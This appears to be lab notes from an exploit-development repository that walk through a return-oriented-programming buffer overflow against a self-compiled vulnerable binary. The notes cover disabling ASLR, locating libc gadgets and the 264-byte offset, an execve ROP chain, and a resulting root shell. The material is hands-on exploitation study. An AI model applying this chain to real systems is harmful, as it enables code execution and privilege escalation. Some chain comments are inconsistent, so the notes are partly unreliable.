# Links
https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx
https://github.com/longld/peda

# Complie out test programm and disable ASLR
$ gcc -fno-stack-protector rop.c -o rop
$ echo 0 > /proc/sys/kernel/randomize_va_space

# To check that ASLR is disable
$ ldd rop
linux-vdso.so.1 (0x00007ffff7ffa000)
libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7a3c000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dda000)

# Find system() function address
$ gdb rop
gdb-peda$ start
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7ffff7a7b4d0 <system

gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b9d359 --> 0x68732f6e69622f ('/bin/sh')

# Find ret gadgets
$ r2 rop
[0x00400400]> /R pop rdi
  0x004005a3                 5f  pop rdi
  0x004005a4                 c3  ret

# Find pattern offset before our exploit
gdb-peda$ pattern_create 400 pattern.txt

# Find string in RSP and use 6 bytes from it
$ gdb rop
gdb-peda$ r < pattern.txt
Starting program: /home/ekoz/github/exploits_dev/linux_shellcode_rop/rop < pattern.txt
RSP: 0x7fffffffda38 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y\020\341\377\367\377\177")

# So we need to rewrite 264 bytes to get RIP
gdb-peda$ pattern_offset HA%dA%
HA%dA% found at offset: 264

# Create exploit string
python2 exploit_rop.py

# Run exploit with our binary
$ (cat exploit.txt; cat) | ./rop
id root
uid=0(root) gid=0(root) groups=0(root)

# No we are going to create a chain with ret gadgets
# Find more new ret gadget. Ret gadget for RSI register
$ r2 rop
[0x00400400]> /R pop rsi
  0x004005a1                 5e  pop rsi
  0x004005a2               415f  pop r15
  0x004005a4                 c3  ret

# Find more new ret gadget. Ret gadget for RAX register
# We need only one pop rax
$ ldd rop
        linux-vdso.so.1 (0x00007ffff7ffa000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7a3c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dda000)

$ r2 rop /usr/lib/libc.so.6
[0x000203b0]> /R pop rax
  0x001a72d2               0000  add byte [rax], al
  0x001a72d4               0100  add dword [rax], eax
  0x001a72d6               2200  and al, byte [rax]
  0x001a72d8                 58  pop rax
  0x001a72d9                 c3  ret

# Get real address of gadget
$ python
>>> hex(0x001a72d8 + 0x00007ffff7a3c000)
'0x7ffff7be32d8'

# Find gadget with which we can call syscall
$ r2 /usr/lib/libc-2.24.so
[0x000203b0]> /R syscall
0x0011f050               0f05  syscall

# Get real address of gadget for syscall
$ python
>>> hex(0x0011f050 + 0x00007ffff7a3c000)
'0x7ffff7b5b050'

# At the end count all together
0x004005a3       # point to gadget `pop rdi; ret;`
0x7ffff7b9d359   # point to string '/bin/sh'
0x004005a1       # point to gadget `pop rsi; ret;`
0x0              # null (`argv`)
0xffffdeadbeef   # some random (to deal with `pop r15;`)
0x7ffff7be32d8   # point to gadget `pop rax; ret`
0x3b             # execve function number for syscall
0x0              # null (for `envp`)
0xffffffffabcd   # some randome (to deal with `pop rbx;`)
0x7ffff7b5b050   syscall

# Create exploit string
python2 exploit_rop_chain.py

# Run exploit with our binary
$ (cat exploit.txt; cat) | ./rop
id root
uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty; pty.spawn("/bin/sh")'